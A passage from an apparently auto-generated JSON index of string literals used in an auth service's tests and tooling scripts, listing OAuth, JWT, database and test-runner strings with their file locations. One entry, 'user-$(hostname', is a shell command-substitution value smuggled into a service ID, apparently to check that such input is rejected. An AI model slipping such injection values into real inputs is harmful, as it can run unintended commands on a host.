      "locations": [
        "auth_service/tests/integration/test_auth_oauth_errors.py:178"
      ]
    },
    "unavailable": {
      "value": "unavailable",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:444",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:776"
      ]
    },
    "unexpected keyword argument 'sslmode'": {
      "value": "unexpected keyword argument 'sslmode'",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_five_whys_reproduction.py:244"
      ]
    },
    "unexpectedly found in database": {
      "value": "unexpectedly found in database",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/base/test_mixins.py:43",
        "auth_service/tests/base/test_mixins.py:63"
      ]
    },
    "unhealthy": {
      "value": "unhealthy",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:186"
      ]
    },
    "unified": {
      "value": "unified",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:162"
      ]
    },
    "unified_report.md": {
      "value": "unified_report.md",
      "category": "test_literals",
      "locations": [
        "scripts/team_updates_test_analyzer.py:37"
      ]
    },
    "unified_secret_789": {
      "value": "unified_secret_789",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_five_whys_reproduction.py:120"
      ]
    },
    "unified_test_runner.py": {
      "value": "unified_test_runner.py",
      "category": "test_literals",
      "locations": [
        "scripts/automated_test_fix_loop.py:17",
        "scripts/batch_fix_and_test.py:69",
        "scripts/iterative_test_fix_loop.py:30",
        "scripts/simple_test_fix_loop.py:18"
      ]
    },
    "unique_code_": {
      "value": "unique_code_",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:261"
      ]
    },
    "unit": {
      "value": "unit",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/config/test_env.py:213",
        "scripts/add_test_markers.py:52",
        "scripts/autonomous_review/test_reviewer.py:213",
        "scripts/autonomous_review/test_reviewer.py:223",
        "scripts/autonomous_review/test_reviewer.py:224",
        "scripts/business_value_test_index.py:84",
        "scripts/business_value_test_index.py:366",
        "scripts/business_value_test_index.py:386",
        "scripts/business_value_test_index.py:391",
        "scripts/business_value_test_index.py:464"
      ]
    },
    "unittest": {
      "value": "unittest",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_reviewer.py:223",
        "scripts/compliance/test_refactor_helper.py:131"
      ]
    },
    "unittest.TestCase": {
      "value": "unittest.TestCase",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_generator.py:271",
        "scripts/compliance/real_test_requirements_enforcer.py:153",
        "scripts/fix_test_import_errors.py:240",
        "scripts/fix_test_import_errors.py:241"
      ]
    },
    "unknown": {
      "value": "unknown",
      "category": "test_literals",
      "locations": [
        "frontend/components/chat/ConnectionStatusIndicator.test.tsx:48",
        "scripts/test_workflows_with_act.py:212"
      ]
    },
    "unmatched": {
      "value": "unmatched",
      "category": "test_literals",
      "locations": [
        "scripts/fix_all_test_issues.py:240"
      ]
    },
    "unrecognized": {
      "value": "unrecognized",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_auth_ssl_failures.py:187"
      ]
    },
    "unverified@example.com": {
      "value": "unverified@example.com",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:620"
      ]
    },
    "up": {
      "value": "up",
      "category": "test_literals",
      "locations": [
        "scripts/start_test_services.py:47"
      ]
    },
    "update": {
      "value": "update",
      "category": "test_literals",
      "locations": [
        "scripts/comprehensive_test_fixer.py:82"
      ]
    },
    "updated_at": {
      "value": "updated_at",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/user_factory.py:44"
      ]
    },
    "url": {
      "value": "url",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_database_manager_missing_method.py:344",
        "scripts/test_cold_start_e2e.py:195",
        "scripts/test_cold_start_e2e.py:196",
        "scripts/test_cold_start_e2e.py:436",
        "scripts/test_cold_start_e2e.py:441",
        "scripts/test_database_url_builder_comprehensive.py:147",
        "scripts/test_database_url_builder_comprehensive.py:151",
        "scripts/test_database_url_builder_comprehensive.py:155",
        "scripts/test_database_url_builder_comprehensive.py:161",
        "scripts/test_staging_deployment.py:45"
      ]
    },
    "url_type": {
      "value": "url_type",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_database_credentials.py:239",
        "auth_service/tests/test_staging_database_credentials.py:240"
      ]
    },
    "us-central1": {
      "value": "us-central1",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:200",
        "scripts/test_staging.py:33"
      ]
    },
    "usage": {
      "value": "usage",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/llm_response_generator.py:114"
      ]
    },
    "use_mocks": {
      "value": "use_mocks",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:129",
        "scripts/unified_test_config.py:137",
        "scripts/unified_test_config.py:145",
        "scripts/unified_test_config.py:153",
        "scripts/unified_test_config.py:303"
      ]
    },
    "used": {
      "value": "used",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_authorization_code_reuse_prevention.py:146",
        "auth_service/tests/unit/test_oauth_authorization_code_reuse_prevention.py:184"
      ]
    },
    "user": {
      "value": "user",
      "category": "test_literals",
      "locations": [
        "auth_service/test_staging_db_connection.py:58",
        "auth_service/test_staging_db_connection.py:95",
        "auth_service/tests/factories/permission_factory.py:223",
        "auth_service/tests/factories/token_factory.py:37",
        "auth_service/tests/factories/token_factory.py:190",
        "auth_service/tests/factories/token_factory.py:215",
        "auth_service/tests/factories/token_factory.py:221",
        "auth_service/tests/factories/user_factory.py:38",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:166",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1249"
      ]
    },
    "user space@domain.com": {
      "value": "user space@domain.com",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:401"
      ]
    },
    "user-": {
      "value": "user-",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_token_generation.py:179",
        "auth_service/tests/test_token_blacklisting_basics.py:219"
      ]
    },
    "user-$(hostname": {
      "value": "user-$(hostname",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:290"
      ]
    },
    "user-to-revoke": {
      "value": "user-to-revoke",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unified/test_jwt_validation.py:263"
      ]
    },
    "user1": {
      "value": "user1",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_session_management.py:364"
      ]
    },
    "user123": {
      "value": "user123",
      "category": "test_literals",
      "locations": [
        "auth_service/debug_db_test.py:57",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:462",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:519",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:578",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:619",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:660",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1185",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1229",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1276",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1326"
      ]
    },
    "user1@example.com": {
      "value": "user1@example.com",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_google.py:248"
      ]
    },
    "user2": {
      "value": "user2",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_session_management.py:365"
      ]
    },
    "user2@example.com": {
      "value": "user2@example.com",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_google.py:256"
      ]
    },
    "user3@example.com": {
      "value": "user3@example.com",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_google.py:263"
      ]
    },
    "user456": {
      "value": "user456",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_session_management.py:231"
      ]
    },
    "user:email": {
      "value": "user:email",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/token_factory.py:220",
        "auth_service/tests/integration/test_oauth_flows_fixtures.py:39"
      ]
    },
    "user:read_profile": {
      "value": "user:read_profile",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/permission_factory.py:19",
        "auth_service/tests/factories/permission_factory.py:185"
      ]
    },
    "user:update_profile": {
      "value": "user:update_profile",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/permission_factory.py:20"
      ]
    },
    "user@": {
      "value": "user@",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:400"
      ]
    },
    "user@domain": {
      "value": "user@domain",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:402"
      ]
    },
    "user@example.com": {
      "value": "user@example.com",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:230"
      ]
    },
    "user@netrasystems.ai": {
      "value": "user@netrasystems.ai",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unified/test_jwt_validation.py:266"
      ]
    },
    "user_123": {
      "value": "user_123",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_models.py:94",
        "auth_service/tests/unit/test_oauth_models.py:104",
        "auth_service/tests/unit/test_oauth_models.py:114",
        "auth_service/tests/unit/test_oauth_models.py:121"
      ]
    },
    "user_agent": {
      "value": "user_agent",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/audit_factory.py:55",
        "auth_service/tests/factories/session_factory.py:36"
      ]
    },
    "user_cancelled_login": {
      "value": "user_cancelled_login",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_errors.py:127"
      ]
    },
    "user_flows": {
      "value": "user_flows",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:357"
      ]
    },
    "user_id": {
      "value": "user_id",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/base/test_base.py:154",
        "auth_service/tests/base/test_mixins.py:182",
        "auth_service/tests/factories/audit_factory.py:52",
        "auth_service/tests/factories/permission_factory.py:81",
        "auth_service/tests/factories/session_factory.py:34",
        "auth_service/tests/test_five_whys_reproduction.py:106",
        "auth_service/tests/test_five_whys_reproduction.py:126",
        "auth_service/tests/test_five_whys_reproduction.py:126",
        "auth_service/tests/test_security.py:185",
        "auth_service/tests/test_security.py:623"
      ]
    },
    "user_info": {
      "value": "user_info",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_errors.py:325"
      ]
    },
    "user_initiated": {
      "value": "user_initiated",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/audit_factory.py:107",
        "auth_service/tests/factories/audit_factory.py:122"
      ]
    },
    "user_not_found": {
      "value": "user_not_found",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_errors.py:258"
      ]
    },
    "user_pr-4": {
      "value": "user_pr-4",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_authentication_failures.py:50",
        "auth_service/tests/test_database_authentication_failures.py:66",
        "auth_service/tests/test_database_connection_validation.py:244",
        "auth_service/tests/test_database_connection_validation.py:251",
        "auth_service/tests/test_staging_database_credentials.py:72",
        "auth_service/tests/test_staging_database_credentials.py:104",
        "auth_service/tests/test_staging_database_credentials.py:112"
      ]
    },
    "uses_real_clickhouse": {
      "value": "uses_real_clickhouse",
      "category": "test_literals",
      "locations": [
        "scripts/add_test_markers.py:44"
      ]
    },
    "uses_real_database": {
      "value": "uses_real_database",
      "category": "test_literals",
      "locations": [
        "scripts/add_test_markers.py:40"
      ]
    },
    "uses_real_llm": {
      "value": "uses_real_llm",
      "category": "test_literals",
      "locations": [
        "scripts/add_test_markers.py:38"
      ]
    },
    "uses_real_redis": {
      "value": "uses_real_redis",
      "category": "test_literals",
      "locations": [
        "scripts/add_test_markers.py:42"
      ]
    },
    "using mock": {
      "value": "using mock",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:234"
      ]
    },
    "utf-8": {
      "value": "utf-8",
      "category": "test_literals",
      "locations": [
        "scripts/add_test_markers.py:150",
        "scripts/add_test_markers.py:170",
        "scripts/align_test_imports.py:88",
        "scripts/align_test_imports.py:105",
        "scripts/align_test_imports.py:222",
        "scripts/align_test_imports.py:232",
        "scripts/align_test_imports.py:321",
        "scripts/align_test_imports.py:337",
        "scripts/align_test_imports.py:350",
        "scripts/align_test_imports.py:363"
      ]
    },
    "util": {
      "value": "util",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:448",
        "scripts/auto_fix_test_violations.py:509"
      ]
    },
    "utilities": {
      "value": "utilities",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:274",
        "scripts/auto_fix_test_sizes.py:305",
        "scripts/compliance/test_refactor_helper.py:433",
        "scripts/compliance/test_refactor_helper.py:571",
        "scripts/compliance/test_refactor_helper.py:679"
      ]
    },
    "utils.py": {
      "value": "utils.py",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/project_test_validator.py:113",
        "scripts/compliance/real_test_requirements_enforcer.py:140",
        "scripts/compliance/real_test_validator.py:70"
      ]
    },
    "uvicorn": {
      "value": "uvicorn",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_startup_integration.py:59",
        "auth_service/tests/test_auth_startup_integration.py:254",
        "auth_service/tests/test_auth_startup_integration.py:263",
        "scripts/test_websocket_dev_mode.py:54"
      ]
    },
    "valid": {
      "value": "valid",
      "category": "test_literals",
      "locations": [
        "auth_service/test_staging_db_connection.py:259",
        "auth_service/test_staging_db_connection.py:269",
        "auth_service/tests/test_five_whys_reproduction.py:42",
        "auth_service/tests/test_security.py:185",
        "auth_service/tests/test_security.py:623",
        "auth_service/tests/test_staging_database_credentials.py:62",
        "auth_service/tests/test_staging_database_credentials.py:113",
        "auth_service/tests/test_staging_database_credentials.py:148",
        "auth_service/tests/test_staging_database_credentials.py:236",
        "auth_service/tests/test_staging_database_credentials.py:290"
      ]
    },
    "valid-client-id.googleusercontent.com": {
      "value": "valid-client-id.googleusercontent.com",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:311",
        "auth_service/tests/test_critical_oauth_environment_failures.py:340"
      ]
    },
    "valid-client-secret": {
      "value": "valid-client-secret",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:267",
        "auth_service/tests/test_critical_oauth_environment_failures.py:312",
        "auth_service/tests/test_critical_oauth_environment_failures.py:341"
      ]
    },
    "valid-oauth-hmac-secret-32-chars": {
      "value": "valid-oauth-hmac-secret-32-chars",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:268"
      ]
    },
    "valid-oauth-hmac-secret-32-chars-long": {
      "value": "valid-oauth-hmac-secret-32-chars-long",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:342"
      ]
    },
    "valid.looking.but-actually-invalid-jwt-token": {
      "value": "valid.looking.but-actually-invalid-jwt-token",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_token_blacklisting_basics.py:145"
      ]
    },
    "valid1": {
      "value": "valid1",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_session_management.py:314"
      ]
    },
    "valid123": {
      "value": "valid123",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_session_cleanup.py:112"
      ]
    },
    "valid@example.com": {
      "value": "valid@example.com",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_token_validation.py:44"
      ]
    },
    "valid_code_": {
      "value": "valid_code_",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:399",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:449",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:499",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:539",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:587",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:628",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:669",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:722",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:791",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:849"
      ]
    },
    "valid_code_for_reuse_": {
      "value": "valid_code_for_reuse_",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:285"
      ]
    },
    "valid_code_with_pkce_": {
      "value": "valid_code_with_pkce_",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:189"
      ]
    },
    "valid_google_token": {
      "value": "valid_google_token",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:130"
      ]
    },
    "valid_secret": {
      "value": "valid_secret",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:228"
      ]
    },
    "valid_staging_config": {
      "value": "valid_staging_config",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_database_credentials.py:347"
      ]
    },
    "valid_token": {
      "value": "valid_token",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:428",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:478",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:531",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:569",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:609",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:650",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:701",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:816",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:873"
      ]
    },
    "validate": {
      "value": "validate",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_refactor_helper.py:683",
        "scripts/compliance/test_refactor_helper.py:727",
        "scripts/comprehensive_test_fixer.py:88",
        "scripts/comprehensive_test_fixer.py:251"
      ]
    },
    "validate_auth_url": {
      "value": "validate_auth_url",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_database_manager_missing_method.py:109",
        "auth_service/tests/test_auth_database_manager_missing_method.py:112",
        "auth_service/tests/test_auth_database_manager_missing_method.py:361",
        "auth_service/tests/test_critical_staging_issues.py:65",
        "auth_service/tests/test_database_connection_validation.py:47"
      ]
    },
    "validate_auth_url must be callable": {
      "value": "validate_auth_url must be callable",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_database_manager_missing_method.py:113"
      ]
    },
    "validate_auth_url should be callable": {
      "value": "validate_auth_url should be callable",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_database_manager_missing_method.py:365"
      ]
    },
    "validate_auth_url should return a boolean": {
      "value": "validate_auth_url should return a boolean",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_authentication_failures.py:73",
        "auth_service/tests/test_database_authentication_failures.py:107"
      ]
    },
    "validate_auth_url should return boolean": {
      "value": "validate_auth_url should return boolean",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_database_manager_missing_method.py:285"
      ]
    },
    "validate_auth_url should return boolean, got:": {
      "value": "validate_auth_url should return boolean, got:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_database_manager_missing_method.py:126",
        "auth_service/tests/test_auth_database_manager_missing_method.py:141"
      ]
    },
    "validate_base_url": {
      "value": "validate_base_url",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_database_sessions.py:44"
      ]
    },
    "validate_pkce_token_refresh": {
      "value": "validate_pkce_token_refresh",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_pkce_token_refresh.py:141"
      ]
    },
    "validation_test": {
      "value": "validation_test",
      "category": "test_literals",
      "locations": [
        "scripts/test_example_message_flow.py:282"
      ]
    },
    "value": {
      "value": "value",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_redis_connection_failover.py:97",
        "auth_service/tests/integration/test_redis_connection_failover.py:146",
        "auth_service/tests/integration/test_redis_connection_failover.py:261",
        "scripts/compliance/test_size_validator.py:269"
      ]
    },
    "value_": {
      "value": "value_",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_redis_connection_failover.py:206",
        "auth_service/tests/integration/test_redis_connection_failover.py:209"
      ]
    },
    "value_score": {
      "value": "value_score",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:75",
        "scripts/business_value_test_index.py:540",
        "scripts/business_value_test_index.py:597"
      ]
    },
    "venv": {
      "value": "venv",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:103",
        "scripts/business_value_test_index.py:131",
        "scripts/check_conftest_violations.py:22",
        "scripts/compliance/project_test_validator.py:40",
        "scripts/compliance/real_test_requirements_enforcer.py:133",
        "scripts/compliance/test_size_validator.py:156",
        "scripts/fix_all_test_issues.py:16",
        "scripts/fix_all_test_issues.py:19",
        "scripts/generate_test_audit.py:22",
        "scripts/test_exclusion_check.py:21"
      ]
    },
    "venv_test": {
      "value": "venv_test",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:103",
        "scripts/compliance/project_test_validator.py:40",
        "scripts/compliance/real_test_requirements_enforcer.py:133",
        "scripts/compliance/test_size_validator.py:156",
        "scripts/fix_all_test_issues.py:16",
        "scripts/fix_all_test_issues.py:19"
      ]
    },
    "verbose": {
      "value": "verbose",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:197",
        "scripts/unified_test_config.py:204",
        "scripts/unified_test_config.py:211",
        "scripts/unified_test_config.py:218",
        "scripts/unified_test_config.py:370"
      ]
    },
    "verified": {
      "value": "verified",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:634"
      ]
    },
    "verified_email": {
      "value": "verified_email",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/user_factory.py:86",
        "auth_service/tests/integration/test_auth_oauth_errors.py:56",
        "auth_service/tests/integration/test_auth_oauth_google.py:50",
        "auth_service/tests/integration/test_auth_oauth_google.py:251",
        "auth_service/tests/integration/test_auth_oauth_google.py:257",
        "auth_service/tests/integration/test_auth_oauth_google.py:265",
        "auth_service/tests/integration/test_auth_oauth_google.py:291",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:124",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:256",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:442"
      ]
    },
    "verify": {
      "value": "verify",
      "category": "test_literals",
      "locations": [
        "scripts/comprehensive_test_fixer.py:88",
        "scripts/comprehensive_test_fixer.py:251"
      ]
    },
    "verify_exp": {
      "value": "verify_exp",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/token_factory.py:175"
      ]
    },
    "verify_signature": {
      "value": "verify_signature",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/token_factory.py:175",
        "auth_service/tests/test_auth_token_generation.py:66",
        "auth_service/tests/test_auth_token_generation.py:79",
        "auth_service/tests/test_auth_token_generation.py:99",
        "auth_service/tests/test_auth_token_generation.py:109",
        "auth_service/tests/test_auth_token_generation.py:127",
        "auth_service/tests/test_auth_token_generation.py:143",
        "auth_service/tests/test_auth_token_generation.py:157",
        "auth_service/tests/test_auth_token_generation.py:197",
        "auth_service/tests/test_auth_token_generation.py:217"
      ]
    },
    "version": {
      "value": "version",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_startup_integration.py:122",
        "scripts/test_ssl_certificates_staging.py:79",
        "scripts/test_websocket_dev_mode.py:96"
      ]
    },
    "version: '3.8'\n\nservices:\n  postgres:\n    image: postgres:15-alpine\n    environment:\n      POSTGRES_USER: netra_test\n      POSTGRES_PASSWORD: test_password\n      POSTGRES_DB: netra_test\n    ports:\n      - \"5433:5432\"\n    healthcheck:\n      test: [\"CMD-SHELL\", \"pg_isready -U netra_test\"]\n      interval: 10s\n      timeout: 5s\n      retries: 5\n\n  redis:\n    image: redis:7-alpine\n    ports:\n      - \"6380:6379\"\n    healthcheck:\n      test: [\"CMD\", \"redis-cli\", \"ping\"]\n      interval: 10s\n      timeout: 5s\n      retries: 5": {
      "value": "version: '3.8'\n\nservices:\n  postgres:\n    image: postgres:15-alpine\n    environment:\n      POSTGRES_USER: netra_test\n      POSTGRES_PASSWORD: test_password\n      POSTGRES_DB: netra_test\n    ports:\n      - \"5433:5432\"\n    healthcheck:\n      test: [\"CMD-SHELL\", \"pg_isready -U netra_test\"]\n      interval: 10s\n      timeout: 5s\n      retries: 5\n\n  redis:\n    image: redis:7-alpine\n    ports:\n      - \"6380:6379\"\n    healthcheck:\n      test: [\"CMD\", \"redis-cli\", \"ping\"]\n      interval: 10s\n      timeout: 5s\n      retries: 5",
      "category": "test_literals",
      "locations": [
        "scripts/start_test_services.py:61"
      ]
    },
    "very": {
      "value": "very",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_authorization_code_reuse_prevention.py:452"
      ]
    },
    "very-long-email": {
      "value": "very-long-email",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:403"
      ]
    },
    "view": {
      "value": "view",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/project_test_validator.py:172"
      ]
    },
    "violation_type": {
      "value": "violation_type",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:627",
        "scripts/compliance/test_size_validator.py:441",
        "scripts/compliance/test_size_validator.py:470",
        "scripts/compliance/test_size_validator.py:471"
      ]
    },
    "violation_type_breakdown": {
      "value": "violation_type_breakdown",
      "category": "test_literals",
      "locations": [
        "scripts/remove_test_stubs.py:262",
        "scripts/remove_test_stubs.py:320"
      ]
    },
    "violations": {
      "value": "violations",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:611",
        "scripts/auto_fix_test_sizes.py:626",
        "scripts/check_test_compliance.py:119",
        "scripts/check_test_compliance.py:175",
        "scripts/check_test_compliance.py:175",
        "scripts/check_test_compliance.py:176",
        "scripts/compliance/test_size_validator.py:77",
        "scripts/compliance/test_size_validator.py:92",
        "scripts/compliance/test_size_validator.py:118",
        "scripts/compliance/test_size_validator.py:436"
      ]
    },
    "violations (dry_run=": {
      "value": "violations (dry_run=",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:796"
      ]
    },
    "violations automatically.": {
      "value": "violations automatically.",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_linter.py:63"
      ]
    },
    "violations in": {
      "value": "violations in",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:718",
        "scripts/remove_test_stubs.py:248"
      ]
    },
    "violations remain after auto-fix:": {
      "value": "violations remain after auto-fix:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_linter.py:74"
      ]
    },
    "violations)": {
      "value": "violations)",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:552",
        "scripts/compliance/real_test_validator.py:318",
        "scripts/compliance/test_violations_reporter.py:116"
      ]
    },
    "violations):": {
      "value": "violations):",
      "category": "test_literals",
      "locations": [
        "scripts/ci/check_test_stubs.py:69",
        "scripts/ci/check_test_stubs.py:77"
      ]
    },
    "violations.": {
      "value": "violations.",
      "category": "test_literals",
      "locations": [
        "scripts/remove_test_stubs.py:371"
      ]
    },
    "w": {
      "value": "w",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/config/test_env.py:111",
        "auth_service/tests/config/test_env.py:121",
        "scripts/align_test_imports.py:418",
        "scripts/analyze_test_mocks.py:185",
        "scripts/analyze_test_overlap.py:501",
        "scripts/analyze_test_overlap.py:612",
        "scripts/auto_fix_test_sizes.py:408",
        "scripts/auto_fix_test_violations.py:536",
        "scripts/auto_fix_test_violations.py:564",
        "scripts/auto_fix_test_violations.py:590"
      ]
    },
    "warning": {
      "value": "warning",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:231",
        "auth_service/tests/auth-service-down-critical-scenarios.py:371",
        "auth_service/tests/test_staging_database_credentials.py:393",
        "scripts/ci/check_test_stubs.py:97"
      ]
    },
    "warnings": {
      "value": "warnings",
      "category": "test_literals",
      "locations": [
        "auth_service/test_staging_db_connection.py:266",
        "auth_service/tests/test_staging_database_credentials.py:113",
        "auth_service/tests/test_staging_database_credentials.py:291",
        "scripts/compliance/test_refactor_helper.py:591",
        "scripts/compliance/test_refactor_helper.py:596",
        "scripts/compliance/test_refactor_helper.py:597",
        "scripts/compliance/test_refactor_helper.py:613",
        "scripts/compliance/test_refactor_helper.py:621",
        "scripts/compliance/test_refactor_helper.py:627",
        "scripts/compliance/test_refactor_helper.py:733"
      ]
    },
    "warp-custom": {
      "value": "warp-custom",
      "category": "test_literals",
      "locations": [
        "scripts/test_workflows_with_act.py:236"
      ]
    },
    "warp-custom-default=catthehacker/ubuntu:act-latest": {
      "value": "warp-custom-default=catthehacker/ubuntu:act-latest",
      "category": "test_literals",
      "locations": [
        "scripts/test_workflows_with_act.py:116",
        "scripts/test_workflows_with_act.py:155"
      ]
    },
    "was cancelled": {
      "value": "was cancelled",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_graceful_shutdown_failures.py:186"
      ]
    },
    "weak password": {
      "value": "weak password",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_database_credentials.py:126"
      ]
    },
    "weak-secret": {
      "value": "weak-secret",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:300",
